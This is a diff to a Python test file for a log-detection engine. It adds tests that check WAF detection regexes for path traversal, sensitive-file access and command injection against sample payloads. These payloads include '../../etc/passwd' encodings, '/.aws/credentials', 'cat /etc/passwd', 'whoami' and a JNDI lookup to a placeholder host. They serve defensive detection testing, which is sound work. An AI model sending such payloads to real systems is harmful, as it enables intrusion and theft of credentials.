@@ -3,6 +3,8 @@
 from __future__ import annotations
 
 import json
+import re
+from pathlib import Path
 
 import pytest
 
@@ -13,6 +15,7 @@ from engine.profiling.field_profiler import FieldProfile, LogFingerprint
 from engine.storage import db, taxonomy_store
 from engine.storage.taxonomy_store import TaxonomyEntry
 from scripts import taxonomy as taxonomy_cli
+from scripts.seed_taxonomy import DEFAULT_SEED_FILE
 
 
 def _fingerprint(**overrides) -> LogFingerprint:
@@ -145,8 +148,110 @@ def test_shipped_seed_entries_match_the_cloudflare_fixture():
     assert {candidate.rule_ref for candidate in candidates} == {
         "internal:cloudflare-waf-sqli",
         "internal:cloudflare-waf-credential-stuffing",
+        "internal:cloudflare-waf-path-traversal",
+        "internal:cloudflare-waf-sensitive-path-access",
+        "internal:cloudflare-waf-rce-command-injection",
     }
     assert all(not candidate.missing_fields for candidate in candidates)
+
+
+# ------------------------------------------------- the ported WAF patterns
+
+
+def _pattern(slug: str, field: str) -> str:
+    """Pull one field's regex out of the shipped seed file."""
+    entries = {e.slug: e for e in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)}
+    for block in entries[slug].detection_logic.values():
+        if isinstance(block, dict) and f"{field}|re" in block:
+            return block[f"{field}|re"]
+    raise AssertionError(f"{slug} has no regex on {field}")
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "../../etc/passwd",
+        "..%2f..%2fetc%2fpasswd",
+        "%2e%2e%2fetc%2fpasswd",
+        "%252e%252e%252fetc",
+        r"..\..\windows\win.ini",
+        "%c0%ae%c0%ae%c0%afetc",
+        "%2E%2E%2Fetc",  # uppercase: only works because (?i) was moved to the front
+    ],
+)
+def test_path_traversal_pattern_covers_its_documented_encodings(payload):
+    assert re.search(_pattern("cloudflare-waf-path-traversal", "ClientRequestPath"), payload)
+
+
+@pytest.mark.parametrize(
+    "payload",
+    ["/.env", "/portal/.git/HEAD", "/wp-login.php", "/admin/config.php", "/web.config",
+     "/docker-compose.yml", "/.aws/credentials", "/x/id_rsa"],
+)
+def test_sensitive_path_pattern_covers_its_documented_artefacts(payload):
+    assert re.search(_pattern("cloudflare-waf-sensitive-path-access", "ClientRequestPath"), payload)
+
+
+@pytest.mark.parametrize(
+    "payload",
+    ["?cmd=;cat /etc/passwd", "${jndi:ldap://x.example/a}", "?q=`id`", "?x=system(",
+     "?x=passthru(", "?a=1 || whoami", "?a=%0aid", "?p=powershell -enc AAA"],
+)
+def test_rce_pattern_covers_its_documented_sinks(payload):
+    assert re.search(_pattern("cloudflare-waf-rce-command-injection", "ClientRequestQuery"), payload)
+
+
+def test_the_rce_pattern_spells_passthru_correctly():
+    """The source pattern had passwthru, which can never match the real PHP function."""
+    pattern = _pattern("cloudflare-waf-rce-command-injection", "ClientRequestQuery")
+
+    assert "passthru" in pattern
+    assert "passwthru" not in pattern
+
+
+def test_the_rce_pattern_bounds_its_expression_match():
+    """Unbounded ${.*} swallows an unrelated span of a large body."""
+    pattern = _pattern("cloudflare-waf-rce-command-injection", "ClientRequestQuery")
+
+    assert r"\$\{[^}]{1,100}\}" in pattern
+
+
+@pytest.mark.parametrize(
+    "clean",
+    ["/products", "/id/news/blog", "?category=shoes&page=2", "/portal/default.aspx"],
+)
+def test_the_ported_patterns_leave_ordinary_traffic_alone(clean):
+    for slug, field in (
+        ("cloudflare-waf-path-traversal", "ClientRequestPath"),
+        ("cloudflare-waf-sensitive-path-access", "ClientRequestPath"),
+        ("cloudflare-waf-rce-command-injection", "ClientRequestPath"),
+    ):
+        assert not re.search(_pattern(slug, field), clean), f"{slug} fired on {clean}"
+
+
+def test_ported_entries_find_exactly_the_attacks_in_the_fixture():
+    from engine.ingestion import parser
+    from engine.prediction.backtest import backtest
+    from engine.profiling.data_classifier import classify
+    from engine.profiling.field_profiler import build_fingerprint, profile_fields
+
+    fixture = Path(__file__).parent / "fixtures" / "cloudflare_waf_firewall_events.csv"
+    sample = parser.parse(fixture)
+    profiles = profile_fields(sample.records, field_names=sample.field_names)
+    fingerprint = build_fingerprint(profiles, classify(sample.field_names),
+                                    record_count=sample.record_count)
+    entries = {e.slug: e for e in taxonomy_store.load_entries_from_json(DEFAULT_SEED_FILE)}
+    candidates = {c.rule_ref: c for c in taxonomy_matcher.match(fingerprint, list(entries.values()))}
+
+    def lines(slug: str) -> list[int]:
+        result = backtest(candidates[f"internal:{slug}"], sample.records, fingerprint,
+                          taxonomy_entry=entries[slug])
+        assert result.evaluated, result.unsupported_reason
+        return result.example_lines
+
+    assert lines("cloudflare-waf-path-traversal") == [13]           # /static/../../etc/passwd
+    assert lines("cloudflare-waf-sensitive-path-access") == [34, 35, 36]  # wp-login, .env, config.php
+    assert lines("cloudflare-waf-rce-command-injection") == []      # no RCE payload in this sample
 
 
 # ----------------------------------------------------------- authoring workflow
